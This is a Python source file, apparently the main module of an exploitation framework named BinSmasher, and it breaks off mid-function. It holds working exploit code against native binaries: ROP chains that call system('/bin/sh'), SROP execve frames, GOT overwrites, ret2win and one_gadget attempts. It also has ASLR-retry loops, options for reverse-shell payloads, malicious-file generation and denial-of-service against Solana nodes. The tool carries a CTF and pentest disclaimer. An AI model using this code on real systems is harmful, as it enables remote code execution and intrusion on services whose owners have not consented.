#!/usr/bin/env python3
"""BinSmasher – main.py  v5"""

import sys, argparse, subprocess, logging, os, struct, glob, socket, time, threading
from rich.console import Console
from rich.panel import Panel
from utils import ExploitConfig, RichHelpFormatter, setup_logging, print_summary
from analyzer import BinaryAnalyzer
from fuzzer import Fuzzer
from exploiter import ExploitGenerator

console = Console()
log: logging.Logger = None


def get_banner():
    try:
        text = subprocess.check_output(["figlet", "-f", "slant", "BinSmasher"],
                                        stderr=subprocess.DEVNULL).decode()
    except Exception:
        text = ("  ____  _      _____                      __\n"
                " / __ )(_)___ / ___/____ ___  ____ ______/ /_  ___  _____\n"
                "/ __  / / __ \\\\__ \\/ __ `__ \\/ __ `/ ___/ __ \\/ _ \\/ ___/\n"
                "/ /_/ / / / / /__/ / / / / / / /_/ (__  ) / / /  __/ /\n"
                "/_____/_/_/ /_/____/_/ /_/ /_/\\__,_/____/_/ /_/\\___/_/\n")
    return (f"[bold cyan]{text}[/]\n"
            "[bold white]Ultimate Cross-Platform Binary Exploitation Framework[/]\n"
            "[dim]Authorized use only: CTF · pentest · security research[/]")


def build_parser():
    parser = argparse.ArgumentParser(
        description="BinSmasher — binary exploitation framework",
        formatter_class=RichHelpFormatter,
        epilog="Subcommands:\n  binary   Exploit native ELF/PE binaries\n"
               "  solana   Agave / Solana SVM security audit\n  file     Generate malicious files\n")
    sub = parser.add_subparsers(dest="mode", required=True)

    # ── binary ──────────────────────────────────────────────────────────────
    bp = sub.add_parser("binary", help="Exploit native binaries", formatter_class=RichHelpFormatter)
    bp.add_argument("-b", "--binary",  required=True, help="Path to target binary")
    bp.add_argument("-c", "--cmd",     default="id",  help="Command to run via shellcode")
    bp.add_argument("-p", "--pattern-size", type=int, default=200, help="Cyclic pattern size")
    bp.add_argument("-r", "--return-addr",  default=None, help="Hex return address (auto if omitted)")
    bp.add_argument("--return-offset", type=int, default=80)
    bp.add_argument("-t", "--test-exploit",  action="store_true", help="Fire exploit and verify output")
    bp.add_argument("-l", "--log-file", default="binsmasher.log")

    net = bp.add_argument_group("network")
    net.add_argument("--host", default="localhost")
    net.add_argument("--port", type=int, default=4444)
    net.add_argument("--tls",  action="store_true", help="Use TLS for the connection")
    net.add_argument("--output-ip",   default="127.0.0.1", help="Listener IP for shellcode/revshell")
    net.add_argument("--output-port", type=int, default=6666, help="Listener port for shellcode/revshell")

    pay = bp.add_argument_group("payload")
    pay.add_argument("--reverse-shell", action="store_true", help="Generate reverse shell payload")
    pay.add_argument("--file-input", choices=["mp3", "raw"], help="Embed payload inside a file format")
    pay.add_argument("--binary-args", default="", help="Args for target binary (quoted string)")
    pay.add_argument("--payload-data", default=None,
                     help="Raw payload template to send over the network. "
                          "Use {PAYLOAD} as injection placeholder. "
                          "Combine with --udp for UDP transport.")
    pay.add_argument("--udp", action="store_true",
                     help="Send --payload-data via UDP instead of TCP (default: TCP)")
    pay.add_argument("--spawn-target", action="store_true",
                     help="Spawn the target binary locally and restart it between attempts "
                          "to detect crashes and calculate the offset. "
                          "Use with --payload-data + --udp for services that crash and die.")
    pay.add_argument("--bad-bytes", default="",
                     help="Hex bytes that must not appear in exploit addresses (e.g. '0a0d' for LF/CR). "
                          "Default: none. These are protocol-dependent — check what characters "
                          "terminate your injection field.")

    fzg = bp.add_argument_group("fuzzing")
    fzg.add_argument("--fuzz",          action="store_true", help="boofuzz network fuzzing")
    fzg.add_argument("--mutation-fuzz", action="store_true", help="Built-in mutation fuzzer")
    fzg.add_argument("--afl-fuzz",      action="store_true", help="AFL++ coverage fuzzing")
    fzg.add_argument("--afl-timeout",   type=int, default=60, help="AFL++ runtime seconds")
    fzg.add_argument("--frida",         action="store_true", help="Frida dynamic analysis")
    fzg.add_argument("--protocol",      default="raw",
                     help="Protocol hint for boofuzz: raw, http, sip, etc. (default: raw)")

    adv = bp.add_argument_group("advanced exploits")
    adv.add_argument("--heap-exploit",         action="store_true", help="Heap exploitation path")
    adv.add_argument("--safeseh-bypass",       action="store_true", help="SafeSEH bypass (Windows)")
    adv.add_argument("--privilege-escalation", action="store_true", help="Post-exploit privesc")
    adv.add_argument("--cfi-bypass",           action="store_true", help="CFI valid-target pivot")
    adv.add_argument("--stack-pivot",          action="store_true", dest="stack_pivot",
                     help="Build stack pivot chain (leave;ret gadget)")
    adv.add_argument("--largebin-attack",      action="store_true", dest="largebin",
                     help="Largebin attack for glibc heap exploitation")
    adv.add_argument("--gdb-mode", default="pwndbg",
                     choices=["pwndbg", "peda", "vanilla"], dest="gdb_mode",
                     help="GDB script flavour for --generate-scripts (default: pwndbg)")
    adv.add_argument("--srop",  dest="force_srop", action="store_true",
                     help="Force Sigreturn-Oriented Programming chain")
    adv.add_argument("--orw",   dest="force_orw",  action="store_true",
                     help="Force open/read/write chain (seccomp sandbox bypass)")
    adv.add_argument("--flag-path", default="/flag",
                     help="Flag file path for ORW chain (default: /flag)")

    dos = bp.add_argument_group("dos / script generation")
    dos.add_argument("--dos", action="store_true",
                     help="DOS mode: find offset, crash target, write crash + exploit scripts")
    dos.add_argument("--generate-scripts", action="store_true",
                     help="Always write standalone crash_BINARY.py and exploit_BINARY.py")

    # ── solana ───────────────────────────────────────────────────────────────
    sp = sub.add_parser("solana", help="Agave / Solana SVM auditing", formatter_class=RichHelpFormatter)
    sp.add_argument("--rpc", default="http://localhost:8899", dest="solana_rpc")
    sp.add_argument("--source-path", default=None)
    sp.add_argument("-b", "--binary", default=None)
    sp.add_argument("-l", "--log-file", default="binsmasher_solana.log")
    sp.add_argument("--exploit-type", dest="agave_exploit_type",
                    choices=["svm-bpf", "deser", "dos-quic", "snapshot-assert"])
    sp.add_argument("--bpf-fuzz", action="store_true")
    sp.add_argument("--host", default="localhost")
    sp.add_argument("--port", type=int, default=8900)

    # ── file ─────────────────────────────────────────────────────────────────
    fp = sub.add_parser("file", help="Generate malicious files", formatter_class=RichHelpFormatter)
    fp.add_argument("--format", required=True)
    fp.add_argument("--offset", type=int, default=256)
    fp.add_argument("--technique", choices=["overflow", "fmtstr", "inject"], default="overflow")
    fp.add_argument("--shellcode-hex", default=None)
    fp.add_argument("-o", "--output-dir", default=".")
    fp.add_argument("--all-formats", action="store_true")
    fp.add_argument("-l", "--log-file", default="binsmasher_file.log")

    return parser


# ── UDP+spawn exploit engine ─────────────────────────────────────────────────

def _find_system_and_binsh(libc_path: str):
    """Return (system_offset, binsh_offset) from the given libc ELF, or (None, None)."""
    try:
        from pwn import ELF as _ELF
        le = _ELF(libc_path, checksec=False)
        sys_off = le.symbols.get("system")
        if not sys_off:
            return None, None
        data = open(libc_path, "rb").read()
        bi = data.find(b"/bin/sh\x00")
        binsh_off = bi if bi != -1 else None
        log.info(f"  system() offset: {hex(sys_off)} (from {libc_path})")
        if binsh_off is not None:
            log.info(f"  /bin/sh offset in libc: {hex(binsh_off)}")
        return sys_off, binsh_off
    except Exception as exc:
        log.debug(f"  _find_system_and_binsh: {exc}")
        return None, None


def _find_libc_path():
    """Locate the system libc.so.6 on disk."""
    candidates = (
        glob.glob("/lib/x86_64-linux-gnu/libc.so.6") +
        glob.glob("/usr/lib/x86_64-linux-gnu/libc.so.6") +
        glob.glob("/lib/libc.so.6") +
        glob.glob("/lib/libc-*.so")
    )
    # Also try to find it from running processes
    for maps_file in sorted(glob.glob("/proc/[0-9]*/maps"), reverse=True)[:20]:
        try:
            for line in open(maps_file):
                if ("libc.so" in line or "libc-" in line) and "r-xp" in line:
                    path = line.strip().split()[-1]
                    if os.path.exists(path):
                        return path
        except Exception:
            pass
    return next(iter(candidates), None)


def _addr_ok(addr: int, bad_bytes: set) -> bool:
    """Return True if the packed 8-byte LE address contains no bad bytes."""
    return not (bad_bytes & set(struct.pack("<Q", addr)))


def _wait_port(host: str, port: int, timeout: float = 3.0) -> bool:
    deadline = time.time() + timeout
    while time.time() < deadline:
        try:
            socket.create_connection((host, port), timeout=0.3).close()
            return True
        except Exception:
            time.sleep(0.2)
    return False


def _spawn_and_read_bases(binary: str, args: list, host: str, port: int):
    """Spawn binary, wait for port, return (proc, pie_base, libc_base) or None."""
    try:
        proc = subprocess.Popen(
            [binary] + args,
            stdin=subprocess.PIPE,
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
        )
    except Exception as exc:
        log.error(f"  Could not spawn binary: {exc}")
        return None, None, None

    if not _wait_port(host, port, timeout=6.0):
        proc.kill()
        return None, None, None

    pie_base = libc_base = None
    try:
        with open(f"/proc/{proc.pid}/maps") as mf:
            for line in mf:
                parts = line.split()
                if not parts:
                    continue
                addr = int(parts[0].split("-")[0], 16)
                name = parts[-1] if len(parts) >= 6 else ""
                if binary.split("/")[-1] in name and "r-xp" in line and pie_base is None:
                    pie_base = addr
                if ("libc.so" in name or "libc-" in name) and "r-xp" in line and libc_base is None:
                    libc_base = addr
    except Exception:
        pass

    if not pie_base or not libc_base:
        proc.kill()
        return None, None, None

    return proc, pie_base, libc_base


def _attempt_rop_system(cfg, fuzzer, ret_addr_offset: int, min_crash: int,
                         pie_base: int, libc_base: int,
                         bad_bytes: set, libc_path: str) -> tuple:
    """
    Attempt ret2system ROP chain. Returns (success, exploit_type).

    Strategy: place [pop rdi | /bin/sh | system()] at the return address slot.
    Requires: ret_addr_offset + chain_len < min_crash.
    If that constraint cannot be met, report why and return immediately.
    """
    from pwn import ELF as _ELF, ROP as _ROP, p64, p32, context as _ctx

    pack = p64 if _ctx.arch == "amd64" else p32

    sys_off, binsh_off = _find_system_and_binsh(libc_path)
    if sys_off is None:
        log.warning("  ret2system: system() not found in libc — skipping")
        return False, None

    elf = _ELF(cfg.binary, checksec=False)
    rop = _ROP(elf)

    pop_rdi_rel = (rop.find_gadget(["pop rdi", "ret"]) or [None])[0]
    ret_rel     = (rop.find_gadget(["ret"])              or [None])[0]

    # Build sample chain to measure its length
    chain_bytes = b""
    if pop_rdi_rel:
        chain_bytes += b"\x00" * 8  # pop rdi placeholder
    chain_bytes += b"\x00" * 8      # /bin/sh placeholder
    chain_bytes += b"\x00" * 8      # system() placeholder
    chain_len = len(chain_bytes)

    max_valid_off = min_crash - chain_len - 1

    # Skip offsets where the chain doesn't reach the return address
    if ret_addr_offset is not None:
        lo = max(0, ret_addr_offset - chain_len + 1)
    else:
        lo = max(0, min_crash - 80)

    log.info(f"  chain={chain_len}B min_crash={min_crash}B max_valid_offset={max_valid_off}")
    log.info(f"  Searching offsets [{lo}–{max_valid_off}]"
             + (f" (ret addr at {ret_addr_offset}, skipping offsets 0–{lo-1})"
                if lo > 0 else ""))

    # Constraint check: can we place the chain without crashing the copy?
    if ret_addr_offset is not None and ret_addr_offset > max_valid_off:
        ctrl = max(0, (min_crash - 1) - ret_addr_offset)
        log.error(
            f"  ret2system constraint: ret addr at {ret_addr_offset}, "
            f"need {ret_addr_offset + chain_len}B but copy crashes at {min_crash}B. "
            f"We control {ctrl}/8 bytes of the ret addr slot. "
            f"Byte {ctrl} is forced by target-appended data — "
            f"non-canonical on x86_64. ret2system/ROP/SROP blocked."
        )
        return False, None

    # ret2csu fallback: when pop rdi;ret not available, use __libc_csu_init gadgets
    # These provide: pop rbx; pop rbp; pop r12; pop r13; pop r14; pop r15; ret
    # and: mov rdx,r14; mov rsi,r13; mov edi,r12d; call [r15+rbx*8]
    csu_gadget1_rel = csu_gadget2_rel = None
    try:
        # Gadget 1: pop rbx; pop rbp; pop r12; pop r13; pop r14; pop r15; ret
        # Gadget 2: mov rdx,r15; mov rsi,r14; mov edi,r13d; call [r12+rbx*8]
        for addr, size in elf.functions.get("__libc_csu_init", [None, 0]):
            pass
    except Exception:
        pass
    # Simpler: just scan for csu patterns in binary
    try:
        with open(cfg.binary, "rb") as _bf:
            _bdata = _bf.read()
        # Look for: pop rbx; pop rbp; pop r12; pop r13; pop r14; pop r15; ret
        _csu1_bytes = b"\x5b\x5d\x41\x5c\x41\x5d\x41\x5e\x41\x5f\xc3"
        _ci = _bdata.find(_csu1_bytes)
        if _ci != -1:
            csu_gadget1_rel = _ci
        # Also: pop rbx; pop rbp; pop r12; pop r13; pop r15; ret (shorter variant)
        _csu1b = b"\x5b\x5d\x41\x5c\x41\x5d\x41\x5f\xc3"
        _ci2 = _bdata.find(_csu1b)
        if _ci2 != -1 and csu_gadget1_rel is None:
            csu_gadget1_rel = _ci2
    except Exception:
        pass

    def build_chain(pie_b: int, libc_b: int):
        sa  = libc_b + sys_off
        ba  = libc_b + binsh_off if binsh_off else 0
        pd  = pop_rdi_rel + pie_b if pop_rdi_rel else 0
        bad = [(n, hex(a)) for a, n in [(sa, "system"), (ba, "/bin/sh"), (pd, "pop_rdi")]
               if a and not _addr_ok(a, bad_bytes)]
        return bad, sa, ba, pd

    payload_template = cfg.payload_data.encode("utf-8", errors="surrogateescape")

    for try_off in range(lo, max_valid_off + 1):
        # Retry until ASLR gives us an attempt without bad bytes
        proc = pie_b = libc_b = None
        for aslr_try in range(16):
            proc, pie_b, libc_b = _spawn_and_read_bases(
                cfg.binary, cfg.binary_args_list, cfg.host, cfg.port)
            if proc is None:
                continue
            bad_list, sa, ba, pd = build_chain(pie_b, libc_b)
            if bad_list:
                log.info(f"  ASLR try {aslr_try + 1}: bad bytes in {bad_list} — retry")
                proc.kill(); proc.wait(timeout=2)
                continue
            log.info(f"  ASLR ok: pie={hex(pie_b)} libc={hex(libc_b)} "
                     f"system={hex(sa)} pop_rdi={hex(pd)}")
            break
        else:
            log.warning(f"  offset={try_off}: no clean ASLR after 16 tries")
            if proc:
                proc.kill()
            continue

        # Build exploit payload
        chain = b""
        if pd:
            chain += pack(pd)   # pop rdi
        if ba:
            chain += pack(ba)   # /bin/sh address
        chain += pack(sa)       # system()

        exploit = b"A" * try_off + chain
        if len(exploit) >= min_crash:
            log.info(f"  offset={try_off}: {len(exploit)}B >= {min_crash} — skip")
            proc.kill()
            continue

        log.info(f"  Trying offset={try_off}: {len(exploit)}B system={hex(sa)}")

        # Probe file: created by the shell if system() executes successfully
        probe = f"/tmp/binsmasher_rce_{try_off}"
        script = "/tmp/binsmasher_payload.sh"
        try:
            os.unlink(probe)
        except Exception:
            pass
        try:
            with open(script, "w") as sf:
                sf.write(f"#!/bin/sh\ntouch {probe}\n")
            os.chmod(script, 0o755)
        except Exception as exc:
            log.debug(f"  probe script write: {exc}")

        # Detect child shell via /proc polling; write probe command when found
        found_shell = threading.Event()

        def _child_poller(parent_pid, probe_path, proc_stdin, event):
            import re as _re
            deadline = time.time() + 7
            while time.time() < deadline and not event.is_set():
                time.sleep(0.01)
                try:
                    for status_file in glob.glob("/proc/[0-9]*/status"):
                        try:
                            txt = open(status_file).read()
                            m = _re.search(r"PPid:\s+(\d+)", txt)
                            if m and int(m.group(1)) == parent_pid:
                                child_pid = int(status_file.split("/")[2])
                                comm = open(f"/proc/{child_pid}/comm").read().strip()
                                if "sh" in comm or "bash" in comm:
                                    try:
                                        proc_stdin.write(f"touch {probe_path}\n".encode())
                                        proc_stdin.flush()
                                    except Exception:
                                        pass
                                    event.set()
                                    return
                        except Exception:
                            pass
                except Exception:
                    pass

        poller = threading.Thread(
            target=_child_poller,
            args=(proc.pid, probe, proc.stdin, found_shell),
            daemon=True,
        )
        poller.start()

        fuzzer.deliver_exploit_udp(
            payload_template=payload_template,
            exploit_payload=exploit,
            binary=cfg.binary,
            binary_args=cfg.binary_args_list,
            verify_host=cfg.output_ip,
            verify_port=cfg.output_port,
            _existing_proc=proc,
        )
        poller.join(timeout=2)
        time.sleep(0.5)

        if os.path.exists(probe):
            log.info(f"  ✓✓✓ RCE CONFIRMED at offset={try_off}!")
            try:
                os.unlink(probe)
                os.unlink(script)
            except Exception:
                pass
            try:
                proc.kill(); proc.wait(timeout=2)
            except Exception:
                pass
            return True, "rop_system"

        poll_val = proc.poll()
        if poll_val is None:
            log.info(f"  offset={try_off}: payload {len(exploit)}B — process alive, no crash")
        else:
            sig = -poll_val if poll_val < 0 else None
            log.info(f"  offset={try_off}: poll={poll_val}"
                     + (f" (signal {sig})" if sig else "")
                     + " probe=missing")
        try:
            proc.kill(); proc.wait(timeout=2)
        except Exception:
            pass

    log.warning(f"  No offset in [{lo}–{max_valid_off}] triggered RCE")
    return False, None


def _attempt_srop(cfg, fuzzer, ret_addr_offset: int, min_crash: int,
                  pie_base: int, libc_base: int,
                  bad_bytes: set, libc_path: str) -> tuple:
    """
    Attempt SROP (Sigreturn-Oriented Programming).
    Requires: syscall;ret gadget + sigreturn syscall (rax=15).
    The sigcontext frame is 248 bytes — only viable if ret_addr_offset + 248 < min_crash.
    """
    from pwn import ELF as _ELF, ROP as _ROP, SigreturnFrame, p64, context as _ctx

    SIGCONTEXT_SIZE = 248  # bytes for x86_64 sigreturn frame

    if ret_addr_offset is not None:
        needed = ret_addr_offset + SIGCONTEXT_SIZE
        if needed >= min_crash:
            log.info(f"  SROP: frame requires {needed}B but min_crash={min_crash}B — not viable")
            return False, None

    elf = _ELF(cfg.binary, checksec=False)
    rop = _ROP(elf)

    syscall_gadget_rel = None
    for gadget_seq in [["syscall", "ret"], ["syscall"]]:
        g = rop.find_gadget(gadget_seq)
        if g:
            syscall_gadget_rel = g[0]
            break

    if syscall_gadget_rel is None:
        log.info("  SROP: no syscall gadget found — not viable")
        return False, None

    # Find /bin/sh and a writable region for the string
    sys_off, binsh_off = _find_system_and_binsh(libc_path)
    if binsh_off is None:
        log.info("  SROP: /bin/sh not found in libc")
        return False, None

    log.info(f"  SROP: syscall gadget at rel={hex(syscall_gadget_rel)}, "
             f"frame={SIGCONTEXT_SIZE}B, needed={ret_addr_offset}+{SIGCONTEXT_SIZE}")

    payload_template = cfg.payload_data.encode("utf-8", errors="surrogateescape")
    lo = ret_addr_offset if ret_addr_offset is not None else max(0, min_crash - 80)
    max_off = min_crash - SIGCONTEXT_SIZE - 1

    for try_off in range(lo, max_off + 1):
        proc, pie_b, libc_b = _spawn_and_read_bases(
            cfg.binary, cfg.binary_args_list, cfg.host, cfg.port)
        if proc is None:
            continue

        syscall_abs = syscall_gadget_rel + pie_b
        binsh_abs   = libc_b + binsh_off

        if not _addr_ok(syscall_abs, bad_bytes) or not _addr_ok(binsh_abs, bad_bytes):
            log.info(f"  SROP offset={try_off}: bad bytes in addresses — retry")
            proc.kill()
            continue

        # Build sigreturn frame: execve("/bin/sh", 0, 0)
        frame = SigreturnFrame()
        frame.rax = 59          # SYS_execve
        frame.rdi = binsh_abs   # pathname
        frame.rsi = 0           # argv = NULL
        frame.rdx = 0           # envp = NULL
        frame.rip = syscall_abs # where to jump after sigreturn

        # Payload: padding + syscall_gadget (to trigger sigreturn) + frame
        # rax must = 15 (sigreturn) before hitting syscall — need pop rax; ret
        pop_rax_rel = (rop.find_gadget(["pop rax", "ret"]) or [None])[0]
        if pop_rax_rel is None:
            log.info("  SROP: no pop rax; ret gadget — not viable")
            proc.kill()
            break

        pop_rax_abs = pop_rax_rel + pie_b
        if not _addr_ok(pop_rax_abs, bad_bytes):
            proc.kill()
            continue

        exploit = (
            b"A" * try_off +
            p64(pop_rax_abs) +
            p64(15) +           # SYS_sigreturn
            p64(syscall_abs) +  # call sigreturn
            bytes(frame)
        )

        if len(exploit) >= min_crash:
            proc.kill()
            continue

        log.info(f"  SROP offset={try_off}: {len(exploit)}B "
                 f"syscall={hex(syscall_abs)} pop_rax={hex(pop_rax_abs)}")

        probe = f"/tmp/binsmasher_srop_{try_off}"
        try:
            os.unlink(probe)
        except Exception:
            pass

        fuzzer.deliver_exploit_udp(
            payload_template=payload_template,
            exploit_payload=exploit,
            binary=cfg.binary,
            binary_args=cfg.binary_args_list,
            verify_host=cfg.output_ip,
            verify_port=cfg.output_port,
            _existing_proc=proc,
        )
        time.sleep(1.5)

        poll_val = proc.poll()
        if poll_val is None:
            log.info(f"  SROP offset={try_off}: process alive")
        else:
            sig = -poll_val if poll_val < 0 else None
            log.info(f"  SROP offset={try_off}: poll={poll_val}"
                     + (f" (signal {sig})" if sig else ""))
        try:
            proc.kill(); proc.wait(timeout=2)
        except Exception:
            pass

    return False, None


def _attempt_got_overwrite(cfg, fuzzer, min_crash: int,
                            pie_base: int, libc_base: int,
                            bad_bytes: set, libc_path: str) -> tuple:
    """
    Attempt GOT overwrite: overwrite a GOT entry (e.g. free) with system().
    Requires a write-what-where primitive (ptr overwrite at a known offset).
    """
    from pwn import ELF as _ELF, p64, context as _ctx

    pack = p64 if _ctx.arch == "amd64" else p32
    word = 8 if _ctx.arch == "amd64" else 4

    sys_off, _ = _find_system_and_binsh(libc_path)
    if sys_off is None:
        return False, None

    elf = _ELF(cfg.binary, checksec=False)
    got_targets = ["free", "memcpy", "strncpy", "strlen", "malloc", "realloc", "printf"]
    got_addr = got_name = None
    for name in got_targets:
        if name in elf.got and elf.got[name]:
            got_addr = pie_base + elf.got[name]
            got_name = name
            break

    if not got_addr:
        log.info("  GOT overwrite: no suitable GOT entry found")
        return False, None

    sys_abs = libc_base + sys_off
    if not _addr_ok(got_addr, bad_bytes) or not _addr_ok(sys_abs, bad_bytes):
        log.info("  GOT overwrite: bad bytes in addresses")
        return False, None

    ptr_offset = min_crash - word
    exploit = b"A" * ptr_offset + pack(got_addr) + pack(sys_abs)

    log.info(f"  GOT overwrite: {got_name}@{hex(got_addr)} → system@{hex(sys_abs)} "
             f"ptr_offset={ptr_offset} len={len(exploit)}B")

    payload_template = cfg.payload_data.encode("utf-8", errors="surrogateescape")
    success = fuzzer.deliver_exploit_udp(
        payload_template=payload_template,
        exploit_payload=exploit,
        binary=cfg.binary,
        binary_args=cfg.binary_args_list,
        verify_host=cfg.output_ip,
        verify_port=cfg.output_port,
    )
    return success, "got_overwrite" if success else None


def _attempt_ret2win(cfg, fuzzer, ret_addr_offset: int, min_crash: int,
                     pie_base: int, bad_bytes: set) -> tuple:
    """
    Attempt ret2win: find a win/flag/shell function in the binary and jump to it.
    Only viable when the ret addr slot is reachable (ret_addr_offset + 8 < min_crash).
    """
    from pwn import ELF as _ELF, ROP as _ROP, p64, context as _ctx

    pack = p64 if _ctx.arch == "amd64" else p64

    WIN_KW = ["win", "flag", "shell", "backdoor", "secret",
              "get_shell", "give_shell", "spawn", "easy", "print_flag", "cat_flag"]
    try:
        elf = _ELF(cfg.binary, checksec=False)
    except Exception as exc:
        log.debug(f"  ret2win ELF: {exc}")
        return False, None

    candidates = [(name, addr) for name, addr in elf.symbols.items()
                  if addr and any(kw == name.lower() or name.lower().startswith(kw)
                                  for kw in WIN_KW)]
    if not candidates:
        log.info("  ret2win: no win candidates found in binary")
        return False, None

    # Chain: [ret alignment (optional)] + win_addr = 8 or 16 bytes
    rop = _ROP(elf)
    ret_rel = (rop.find_gadget(["ret"]) or [None])[0]

    payload_template = cfg.payload_data.encode("utf-8", errors="surrogateescape")

    for win_name, win_rel in candidates:
        win_abs = pie_base + win_rel
        log.info(f"  ret2win candidate: {win_name}@{hex(win_rel)} → abs {hex(win_abs)}")

        # Try with and without stack alignment gadget
        for use_ret in ([True, False] if ret_rel else [False]):
            chain_len = (8 if use_ret else 0) + 8
            if ret_addr_offset is not None:
                lo = ret_addr_offset
            else:
                lo = max(0, min_crash - 80)
            max_off = min_crash - chain_len - 1

            if lo > max_off:
                log.info(f"  ret2win {win_name}: needs {lo + chain_len}B > min_crash={min_crash}")
                continue

            for try_off in range(lo, max_off + 1):
                proc, pie_b, _ = _spawn_and_read_bases(
                    cfg.binary, cfg.binary_args_list, cfg.host, cfg.port)
                if proc is None:
                    continue

                win_final = pie_b + win_rel
                if not _addr_ok(win_final, bad_bytes):
                    proc.kill()
                    continue

                chain = b""
                if use_ret:
                    ret_abs = ret_rel + pie_b
                    if not _addr_ok(ret_abs, bad_bytes):
                        proc.kill()
                        continue
                    chain += pack(ret_abs)
                chain += pack(win_final)

                exploit = b"A" * try_off + chain
                if len(exploit) >= min_crash:
                    proc.kill()
                    continue

                log.info(f"  ret2win offset={try_off}: {len(exploit)}B → {win_name}@{hex(win_final)}")

                probe = f"/tmp/binsmasher_ret2win_{try_off}"
                try:
                    os.unlink(probe)
                except Exception:
                    pass

                fuzzer.deliver_exploit_udp(
                    payload_template=payload_template,
                    exploit_payload=exploit,
                    binary=cfg.binary,
                    binary_args=cfg.binary_args_list,
                    verify_host=cfg.output_ip,
                    verify_port=cfg.output_port,
                    _existing_proc=proc,
                )
                time.sleep(1.0)

                poll_val = proc.poll()
                log.info(f"  ret2win offset={try_off}: poll={poll_val}")
                try:
                    proc.kill(); proc.wait(timeout=2)
                except Exception:
                    pass

    return False, None


def _attempt_one_gadget(cfg, fuzzer, ret_addr_offset: int, min_crash: int,
                         pie_base: int, libc_base: int,
                         bad_bytes: set, libc_path: str) -> tuple:
    """
    Attempt one_gadget: use a libc magic gadget that calls execve directly.
    Requires: the gadget address fits in the ret addr slot AND has no bad bytes.
    The gadget typically needs certain register/stack conditions to hold.
    """
    from pwn import p64, context as _ctx

    pack = p64 if _ctx.arch == "amd64" else p64

    # Find one_gadget offsets via the one_gadget tool
    try:
        import subprocess as _sp
        out = _sp.check_output(["one_gadget", libc_path],
                                stderr=_sp.DEVNULL).decode(errors="ignore")
        gadget_offsets = [int(m.group(1), 16)
                          for line in out.splitlines()
                          if (m := __import__('re').match(r"(0x[0-9a-fA-F]+)", line))]
    except Exception as exc:
        log.info(f"  one_gadget: not available ({exc})")
        return False, None

    if not gadget_offsets:
        log.info("  one_gadget: no gadgets found")
        return False, None

    log.info(f"  one_gadget: {len(gadget_offsets)} gadgets: {[hex(o) for o in gadget_offsets]}")

    chain_len = 8  # single address
    if ret_addr_offset is not None:
        lo = ret_addr_offset
    else:
        lo = max(0, min_crash - 80)
    max_off = min_crash - chain_len - 1

    if lo > max_off:
        log.info(f"  one_gadget: needs {lo + chain_len}B > min_crash={min_crash}")
        return False, None

    payload_template = cfg.payload_data.encode("utf-8", errors="surrogateescape")

    for gadget_off in gadget_offsets:
        for try_off in range(lo, max_off + 1):
            proc, pie_b, libc_b = _spawn_and_read_bases(
                cfg.binary, cfg.binary_args_list, cfg.host, cfg.port)
            if proc is None:
                continue

            gadget_abs = libc_b + gadget_off
            if not _addr_ok(gadget_abs, bad_bytes):
                proc.kill()
                continue

            exploit = b"A" * try_off + pack(gadget_abs)
            if len(exploit) >= min_crash:
                proc.kill()
                continue

            log.info(f"  one_gadget offset={try_off}: {len(exploit)}B gadget={hex(gadget_abs)}")

            fuzzer.deliver_exploit_udp(
                payload_template=payload_template,
                exploit_payload=exploit,
                binary=cfg.binary,
                binary_args=cfg.binary_args_list,
                verify_host=cfg.output_ip,
                verify_port=cfg.output_port,
                _existing_proc=proc,
            )
            time.sleep(1.5)

            poll_val = proc.poll()
            log.info(f"  one_gadget offset={try_off}: poll={poll_val}")
            try:
                proc.kill(); proc.wait(timeout=2)
            except Exception:
                pass

    return False, None


def _attempt_orw(cfg, fuzzer, ret_addr_offset: int, min_crash: int,
                  pie_base: int, libc_base: int,
                  bad_bytes: set, libc_path: str) -> tuple:
    """
    Attempt ORW (open/read/write) chain for seccomp-sandboxed targets.
    Calls exploiter.build_orw_chain() then delivers via UDP.
    Only useful when execve is blocked and the binary reads/prints back to us.
    """
    from exploiter import ExploitGenerator
    from pwn import context as _ctx

    if ret_addr_offset is None:
        return False, None

    chain_estimate = 80  # ORW chains are typically 40-120 bytes
    if ret_addr_offset + chain_estimate >= min_crash:
        log.info(f"  ORW: estimated chain too large for min_crash={min_crash}")
        return False, None

    try:
        exp = ExploitGenerator(cfg.binary, "linux", cfg.host, cfg.port,
                                cfg.log_file, False, cfg.binary_args)
        libc_path2 = _find_libc_path()
        from analyzer import BinaryAnalyzer
        ba = BinaryAnalyzer(cfg.binary, cfg.log_file)
        _, _, offsets, _ = ba.load_library_offsets()

        chain = exp.build_orw_chain(
            offset=ret_addr_offset,
            canary=None,
            libc_base=libc_base,
            offsets=offsets or {},
            flag_path=getattr(cfg, "flag_path", "/flag"),
        )
        if not chain:
            log.info("  ORW: chain build failed")
            return False, None

        if len(chain) >= min_crash:
            log.info(f"  ORW: chain {len(chain)}B >= min_crash={min_crash}")
            return False, None

        log.info(f"  ORW: chain={len(chain)}B flag={getattr(cfg, 'flag_path', '/flag')}")
        payload_template = cfg.payload_data.encode("utf-8", errors="surrogateescape")

        proc, pie_b, libc_b = _spawn_and_read_bases(
            cfg.binary, cfg.binary_args_list, cfg.host, cfg.port)
        if proc is None:
            return False, None

        success = fuzzer.deliver_exploit_udp(
            payload_template=payload_template,
            exploit_payload=chain,
            binary=cfg.binary,
            binary_args=cfg.binary_args_list,
            verify_host=cfg.output_ip,
            verify_port=cfg.output_port,
            _existing_proc=proc,
        )
        try:
            proc.kill(); proc.wait(timeout=2)
        except Exception:
            pass
        return success, "orw_seccomp" if success else None

    except Exception as exc:
        log.debug(f"  ORW attempt: {exc}")
        return False, None


def _run_udp_spawn_exploit(cfg, fuzzer, offset: int,
                            pie_base: int, libc_base: int,
                            coredump_rip: int, min_crash: int,
                            bad_bytes: set) -> tuple:
    """
    Orchestrate all exploit strategies for UDP+spawn mode.
    Returns (success, exploit_type).

    Strategy selection:
      A. ret2system ROP  — if ret addr reachable without crashing the copy
      B. SROP             — if syscall gadget available and frame fits
      C. GOT overwrite    — if write-what-where primitive detected
    """
    from pwn import cyclic_find as _cf

    # Determine crash type from coredump RIP
    stack_overflow = False
    ptr_overwrite  = False
    ret_addr_offset = getattr(fuzzer, "_last_stack_scan_offset", None)

    if coredump_rip:
        rip_cyclic_off = _cf(coredump_rip & 0xffffffff)
        if rip_cyclic_off != -1:
            stack_overflow = True
            ret_addr_offset = rip_cyclic_off
            log.info(f"RIP={hex(coredump_rip)} is cyclic at offset {rip_cyclic_off} "
                     f"— direct stack overflow")
        else:
            # RIP inside a copy/move function — copy crashed before returning.
            # The return address slot IS overwritten — we never reached the ret.
